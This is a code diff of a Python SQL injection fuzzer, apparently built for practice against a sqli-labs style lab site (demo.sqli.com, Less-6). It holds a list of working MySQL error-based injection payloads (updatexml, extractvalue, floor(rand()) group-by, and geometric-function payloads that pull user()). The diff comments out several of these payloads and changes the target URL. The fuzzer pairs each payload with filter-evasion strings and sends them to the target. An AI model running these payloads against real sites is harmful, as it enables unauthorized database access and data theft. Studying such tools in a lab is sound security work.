@@ -18,13 +18,13 @@ class Fuzz:
         ' union select count(*),1,concat(0x5e5e5e,user(),0x5e5e5e,floor(rand(0)*2))x from information_schema.tables group by x ',
         ' and (updatexml(1,concat(0x5e5e5e,(select user()),0x5e5e5e),1))',
         ' and (extractvalue(1,concat(0x5e5e5e,(select user()),0x5e5e5e)))'
-        ' and geometrycollection((select * from(select * from(select user())a)b))'
-        ' and multipoint((select * from(select * from(select user())a)b))',
-        ' and polygon((select * from(select * from(select user())a)b))',
-        ' and multipolygon((select * from(select * from(select user())a)b))',
-        ' and linestring((select * from(select * from(select user())a)b))',
-        ' and multilinestring((select * from(select * from(select user())a)b))',
-        ' and exp(~(select * from(select user())a))'
+        # ' and geometrycollection((select * from(select * from(select user())a)b))',
+        # ' and multipoint((select * from(select * from(select user())a)b))',
+        # ' and polygon((select * from(select * from(select user())a)b))',
+        # ' and multipolygon((select * from(select * from(select user())a)b))',
+        # ' and linestring((select * from(select * from(select user())a)b))',
+        # ' and multilinestring((select * from(select * from(select user())a)b))',
+        # ' and exp(~(select * from(select user())a))'
     ]
         self.error_payloads = [i+j for i in self.error_payload for j in self.Notes] # 将payload与过滤字符结合
         self.standard_length = len(requests.get(self.url, headers=self.headers).text)  # 正常url响应包的长度
@@ -71,7 +71,7 @@ class Fuzz:
         self.error_attack()
         return self.RedPayloads, self.YellowPayloads, self.BluePayloads, self.GreenPayloads
 
-url = 'http://demo.sqli.com/Less-6/?id=1"&a=2'
+url = 'http://demo.sqli.com/Less-6/?id=1"'
 cookies = None
 #url = "http://demo.sqli.com/Less-10/?id=1"
 Fuzz(url, cookies).attack()
